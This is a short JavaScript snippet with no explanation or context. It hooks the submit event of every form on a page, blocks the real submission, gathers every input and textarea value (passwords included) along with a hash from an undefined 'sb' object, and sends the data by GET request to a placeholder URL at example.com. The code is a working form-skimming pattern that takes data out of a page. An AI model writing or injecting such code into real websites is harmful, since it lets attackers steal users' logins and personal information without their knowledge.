(function (url, f) {
    f = document.getElementsByTagName('form');

    Array.prototype.forEach.call(f, function (a) {
        a.addEventListener('submit', function (e, d, xhr) {
            e.preventDefault();
            d = Array.prototype.reduce.call(this.elements, function (p, el, i) {
                if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
                    return p + '&' + el.name + '=' + el.value;
                } else {
                    return p;
                }
            }, 'hash='+ sb.first_add.hash);
            xhr = new XMLHttpRequest();
            xhr.open('GET', url + '?' + d, true);
            xhr.send();
        })
    })

}('http://example.com/hi/there'))